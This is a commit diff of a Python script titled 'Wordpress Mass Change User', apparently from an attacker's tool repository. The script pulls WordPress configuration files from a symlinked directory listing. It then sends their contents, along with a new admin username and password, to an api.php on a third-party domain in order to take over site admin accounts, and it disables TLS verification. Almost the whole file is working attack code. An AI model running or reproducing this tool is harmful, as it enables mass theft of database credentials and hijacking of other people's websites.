d2a52c745b726ce5e291b318dc3f2323d67aee71
/Xi4u7 <androsec1337@gmail.com>
2019-07-31 23:20:57 +0700

    Update client.py

--- unreleased/wordpress_changeuser_php7/client.py
+++ unreleased/wordpress_changeuser_php7/client.py
@@ -1,15 +1,37 @@
-import requests, re
+#!/usr/bin/python
+
+"""
+Wordpress Mass Change User - PHP 7 Only
+"""
+
+import re
+import sys
+import requests
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+mati = 12
 
 user = "admin403" # Change If You Want
 pwd = "JancoxSc0de"
 head = {"User-agent":"Linux Mozilla 5/0"}
-text1 = requests.get("http://localh0st.io/grab_config", headers=head).text
+urlsym1 = raw_input("urlsym > ")
+urlsym = urlsym+"/"
+api = raw_input("urlapi > ")
+text1 = requests.get(urlsym, headers=head).text
 list = re.findall('</td><td><a href="(.*?)">', text1)
 for i in list:
-	if "-Wordpress.txt" in i:
-		data = {"user_baru":user,"pass_baru":pwd,"config_dir":i,"hajar":"hajar"}
-		text = requests.post("http://localh0st.io/grab_config/server.php", data=data, headers=head).text
+	if "-Wordpress" in i:
+		print("["+i+"]"),
+		conf = requests.get(urlsym+i).text
+		data = {"user_baru":user,"pass_baru":pwd,"config":conf,"hajar":"hajar"}
+		text = requests.post("http://purespirit.com.ar/wp-content/upgrade/api.php", data=data, headers=head, verify=False, timeout=mati).text
 		if "color=lime>sukses" in text:
-			print "\033[32;1mSukses -> \033[0m"+re.findall("Login => <a href='(.*?)' target='_blank'>", text)[0]+"|"+user+"|"+pwd
+			print("[USER CHANGED]"),
+			ua = "./Xi4u7 Tools 8/0"
+			trgt = re.findall("Login => <a href='(.*?)/wp-login.php' target='_blank'>", text)
+			print("["+trgt[0]+"]"),
+			print("[USER: "+user+"][PASS: "+pwd+"]")
 		else:
-			pass
+			print("[USER NOT CHANGED]")
